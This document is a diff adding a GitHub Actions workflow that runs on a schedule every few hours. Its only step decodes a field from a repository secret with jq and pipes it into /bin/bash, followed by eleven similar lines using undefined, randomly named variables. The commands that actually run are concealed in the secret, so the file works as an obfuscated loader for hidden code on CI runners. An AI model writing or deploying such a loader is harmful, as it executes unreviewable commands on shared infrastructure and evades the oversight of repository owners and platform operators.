@@ -1,0 +1,28 @@
+name: luxuejiao1988
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luxuejiao1988
+        env:
+          o64: ${{ secrets.o64 }}
+        run: |
+          echo $o64 | jq -r .sqzq7 | /bin/bash
+          echo $ipnai283 | jq -r .k77 | /bin/bash
+          echo $pt58 | jq -r .ytq37 | /bin/bash
+          echo $cj0 | jq -r .utfa556 | /bin/bash
+          echo $t027 | jq -r .d8619 | /bin/bash
+          echo $anxj5545 | jq -r .wg70043 | /bin/bash
+          echo $uyw57 | jq -r .jijyf0905 | /bin/bash
+          echo $ofvz24 | jq -r .lnylp2 | /bin/bash
+          echo $u290 | jq -r .eybz7961 | /bin/bash
+          echo $p40236 | jq -r .p9686 | /bin/bash
+          echo $ihgc43 | jq -r .iqxx16 | /bin/bash
+          echo $apmy83998 | jq -r .lhdr7021 | /bin/bash
+
